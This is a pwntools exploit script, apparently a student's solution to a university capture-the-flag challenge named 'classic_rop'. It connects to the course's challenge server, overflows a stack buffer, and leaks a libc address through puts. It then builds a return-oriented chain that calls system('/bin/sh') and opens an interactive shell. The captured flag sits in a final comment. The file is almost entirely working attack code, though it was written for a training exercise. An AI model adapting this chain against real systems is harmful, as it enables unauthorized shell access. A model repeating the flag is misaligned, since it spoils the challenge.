from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./classic_rop"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1202
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
r = ROP(CHALLENGE)
chain1 = [
    r.rdi.address,       # 1. pop rdi; ret - load next value into rdi register
    e.got.puts,          # 2. puts@got address - will be argument for puts (loaded into rdi)
    e.plt.puts,          # 3. call puts@plt to print the GOT entry (leak libc address)
    e.symbols.main       # 4. return to main for second stage exploitation
]

print(p.recvuntil(b"!\n").decode())
size_1 = 0x28 + 0x8 * len(chain1) + 1
p.sendline(str(size_1).encode())
log.info(f"Sending size number in base 10: {size_1}")

msg_1 = b"B" * 0x28 + b"".join([p64(c1) for c1 in chain1])
p.send(msg_1)
log.info(f"Sending message in raw bytes: {msg_1}")

glibc_puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Receiving leaked puts address: {hex(glibc_puts_addr)}")

glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_puts_addr - glibc_e.symbols.puts
glibc_binsh_addr = glibc_base_addr + next(glibc_e.search(b"/bin/sh"))
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

glibc_r = ROP("libc.so.6")
chain2 = [
    glibc_r.rdi.address + glibc_base_addr,     # 1. Address of "pop rdi; ret" gadget in libc - calculated by adding gadget offset to libc base
    glibc_binsh_addr,                          # 2. Address of "/bin/sh" string in libc - this will be popped into rdi register
    glibc_r.ret.address + glibc_base_addr,     # 3. Address of ret instruction in libc - for stack alignment (adding base address to get actual location)
    glibc_system_addr                          # 4. Address of system() in libc - will be called with "/bin/sh" argument from rdi
]

print(p.recvuntil(b"!\n"))
size_2 = 0x28 + 0x8 * len(chain2) + 1
p.sendline(str(size_2).encode())
log.info(f"Sending size number in base 10: {size_2}")

msg_2 = b"B" * 0x28 + b"".join([p64(c2) for c2 in chain2])
p.send(msg_2)
log.info(f"Sending message in raw bytes: {msg_2}")

p.interactive()

# flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_d82f5c408289f889}
